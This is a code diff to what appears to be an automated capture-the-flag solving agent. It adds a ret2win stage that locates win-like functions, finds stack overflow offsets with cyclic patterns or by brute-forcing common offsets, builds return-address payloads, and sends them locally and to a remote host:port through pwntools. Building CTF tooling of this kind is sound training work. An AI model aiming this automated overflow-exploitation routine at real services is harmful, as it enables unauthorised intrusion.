@@ -4,14 +4,17 @@ Orchestration order for a binary challenge:
   1. checksec — identify mitigations
   2. Ghidra static analysis — functions, strings, imports (skipped if GHIDRA_HOME unset)
   3. angr symbolic execution — auto-find input for win/flag functions (skipped if angr missing)
-     3b. Execute binary with payload, scan output for a real flag pattern.
-         Payload goes to artifacts; only mark solved when a flag is confirmed.
-  4. pwntools template — fallback exploitation scaffold + LLM strategy advice
+     3b. Execute binary with payload locally; if no flag, send to remote (connection_info).
+  4. ret2win — nm/objdump to find win function, cyclic to find offset, craft + deliver payload
+     locally then remotely; tries common offsets when core dump unavailable.
+  5. pwntools template — fallback exploitation scaffold + LLM strategy advice
 """
 from __future__ import annotations
 
 import logging
 import os
+import re
+import struct
 import subprocess
 from typing import Any, Dict, List, Optional
 
@@ -128,18 +131,32 @@ class PwnAgent(BaseAgent):
         steps.extend(angr_steps)
 
         if payload is not None:
-            # Phase 3b — run binary with payload and look for a real flag
+            # Phase 3b — run binary with payload locally
             run_steps, flag_str = self._phase_run_with_payload(binary, payload)
             steps.extend(run_steps)
             if flag_str:
                 return self._result(challenge, "solved", steps, flag=flag_str)
-            # Payload found but no flag confirmed — store as artifact
+
+            # Phase 3c — send angr payload to remote if available
+            conn_info = challenge.get("connection_info")
+            if conn_info:
+                remote_steps, flag_str = self._send_payload_remote(conn_info, payload)
+                steps.extend(remote_steps)
+                if flag_str:
+                    return self._result(challenge, "solved", steps, flag=flag_str)
+
             return self._result(
                 challenge, "attempted", steps,
                 artifacts={"angr_payload": payload.hex()},
             )
 
-        # Phase 4 — pwntools template + LLM fallback
+        # Phase 4 — ret2win: find win function + overflow offset, craft + deliver payload
+        ret2win_steps, flag_str = self._phase_ret2win(binary, challenge)
+        steps.extend(ret2win_steps)
+        if flag_str:
+            return self._result(challenge, "solved", steps, flag=flag_str)
+
+        # Phase 5 — pwntools template + LLM fallback
         steps.extend(self._phase_pwntools_fallback(binary, challenge))
 
         return self._result(challenge, "attempted", steps)
@@ -323,6 +340,238 @@ class PwnAgent(BaseAgent):
                 steps.append(f"LLM unavailable: {exc}")
 
         return steps
+
+    # ------------------------------------------------------------------
+    # ret2win helpers
+    # ------------------------------------------------------------------
+
+    def _phase_ret2win(
+        self, binary: str, challenge: Dict[str, Any]
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        steps.append("Attempting ret2win exploitation...")
+
+        if self._is_pie(binary):
+            steps.append("ret2win: PIE enabled — static addresses unreliable; skipping")
+            return steps, None
+
+        win_addr = self._find_win_addr(binary, steps)
+        if win_addr is None:
+            steps.append("ret2win: no win-like function found")
+            return steps, None
+
+        conn_info = challenge.get("connection_info")
+        offset = self._find_overflow_offset(binary, steps)
+
+        if offset is not None:
+            ret_steps, flag = self._try_ret2win_at_offset(binary, offset, win_addr, conn_info)
+            steps.extend(ret_steps)
+            return steps, flag
+
+        steps.append("Core dump unavailable; trying common offsets")
+        for candidate in [40, 56, 72, 88, 104, 120, 136, 152, 168, 200, 256]:
+            ret_steps, flag = self._try_ret2win_at_offset(binary, candidate, win_addr, conn_info)
+            steps.extend(ret_steps)
+            if flag:
+                return steps, flag
+
+        return steps, None
+
+    def _try_ret2win_at_offset(
+        self,
+        binary: str,
+        offset: int,
+        win_addr: int,
+        conn_info: Optional[str],
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        ret_gadget = self._find_ret_gadget(binary)
+
+        # On x86-64 some functions need 16-byte stack alignment; try both orderings.
+        base = b"A" * offset
+        payloads: List[tuple[str, bytes]] = []
+        if ret_gadget:
+            payloads.append((
+                f"offset={offset} + ret(0x{ret_gadget:x}) + win",
+                base + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr),
+            ))
+        payloads.append((
+            f"offset={offset} + win",
+            base + struct.pack("<Q", win_addr),
+        ))
+
+        for desc, payload in payloads:
+            steps.append(f"Trying ret2win: {desc}")
+            run_steps, flag = self._phase_run_with_payload(binary, payload)
+            steps.extend(run_steps)
+            if flag:
+                return steps, flag
+
+            if conn_info:
+                remote_steps, flag = self._send_payload_remote(conn_info, payload)
+                steps.extend(remote_steps)
+                if flag:
+                    return steps, flag
+
+        return steps, None
+
+    def _find_win_addr(self, binary: str, steps: List[str]) -> Optional[int]:
+        WIN_KEYWORDS = ("win", "flag", "shell", "backdoor", "success", "correct")
+        for cmd in (
+            ["nm", "-n", "--defined-only", binary],
+            ["objdump", "-t", binary],
+        ):
+            try:
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+                if r.returncode != 0:
+                    continue
+                for line in r.stdout.splitlines():
+                    parts = line.split()
+                    if len(parts) < 2:
+                        continue
+                    name = parts[-1]
+                    addr_str = parts[0]
+                    if any(kw in name.lower() for kw in WIN_KEYWORDS):
+                        try:
+                            addr = int(addr_str, 16)
+                            if addr > 0:
+                                steps.append(f"ret2win: found '{name}' @ 0x{addr:x}")
+                                return addr
+                        except ValueError:
+                            continue
+            except Exception as exc:
+                logger.debug("Symbol lookup (%s) failed: %s", cmd[0], exc)
+        return None
+
+    def _find_overflow_offset(self, binary: str, steps: List[str]) -> Optional[int]:
+        try:
+            import pwn  # type: ignore
+            pwn.context.log_level = "error"
+        except ImportError:
+            steps.append("pwntools not installed; falling back to common offsets")
+            return None
+
+        try:
+            r = subprocess.run(["file", binary], capture_output=True, text=True)
+            pwn.context.arch = "i386" if "32-bit" in r.stdout else "amd64"
+        except Exception:
+            pwn.context.arch = "amd64"
+
+        try:
+            import resource
+            resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
+        except Exception:
+            pass
+
+        try:
+            p = pwn.process(binary)
+            p.sendline(pwn.cyclic(300))
+            p.wait()
+            try:
+                core = p.corefile
+                if core is None:
+                    raise ValueError("no core dump")
+                fault = core.fault_addr
+                offset = pwn.cyclic_find(fault)
+                if offset >= 0:
+                    steps.append(f"Overflow offset = {offset} (core dump, fault @ 0x{fault:x})")
+                    return offset
+            except Exception as core_exc:
+                logger.debug("Core dump analysis: %s", core_exc)
+        except Exception as exc:
+            logger.debug("Overflow offset detection: %s", exc)
+
+        return None
+
+    def _find_ret_gadget(self, binary: str) -> Optional[int]:
+        """Return the address of a bare 'ret' gadget for x86-64 stack alignment."""
+        try:
+            r = subprocess.run(
+                ["ROPgadget", "--binary", binary, "--only", "ret"],
+                capture_output=True, text=True, timeout=15,
+            )
+            for line in r.stdout.splitlines():
+                if " : ret" == line[line.find(" : "):].rstrip():
+                    addr_str = line.split(" : ")[0].strip()
+                    try:
+                        return int(addr_str, 16)
+                    except ValueError:
+                        continue
+        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
+            pass
+
+        try:
+            r = subprocess.run(
+                ["objdump", "-d", binary], capture_output=True, text=True, timeout=15
+            )
+            for line in r.stdout.splitlines():
+                m = re.match(r"\s+([0-9a-f]+):\s+c3\s+ret\b", line)
+                if m:
+                    return int(m.group(1), 16)
+        except Exception:
+            pass
+
+        return None
+
+    def _is_pie(self, binary: str) -> bool:
+        try:
+            r = subprocess.run(
+                ["readelf", "-h", binary], capture_output=True, text=True, timeout=5
+            )
+            for line in r.stdout.splitlines():
+                if "Type:" in line:
+                    return "DYN" in line
+        except Exception:
+            pass
+        return False
+
+    def _send_payload_remote(
+        self, conn_info: str, payload: bytes
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        try:
+            host, port_str = conn_info.rsplit(":", 1)
+            port = int(port_str)
+        except (ValueError, AttributeError):
+            steps.append(f"Could not parse connection_info: {conn_info!r}")
+            return steps, None
+
+        steps.append(f"Sending payload to remote {host}:{port}...")
+
+        try:
+            import pwn  # type: ignore
+            pwn.context.log_level = "error"
+            io = pwn.remote(host, port, timeout=10)
+
+            try:
+                banner = io.recvrepeat(timeout=2).decode("utf-8", errors="replace")
+                if banner.strip():
+                    steps.append(f"Remote banner: {banner[:200]!r}")
+            except Exception:
+                pass
+
+            io.sendline(payload)
+
+            try:
+                output = io.recvall(timeout=5).decode("utf-8", errors="replace")
+            except Exception:
+                output = ""
+            io.close()
+
+            preview = output[:300].replace("\n", " ")
+            steps.append(f"Remote output: {preview!r}")
+
+            flag = find_first_flag(output)
+            if flag:
+                steps.append(f"Flag found via remote: {flag}")
+            return steps, flag
+
+        except ImportError:
+            steps.append("pwntools not installed; cannot send to remote")
+        except Exception as exc:
+            steps.append(f"Remote delivery failed: {exc}")
+
+        return steps, None
 
     # ------------------------------------------------------------------
     # Lazy loaders
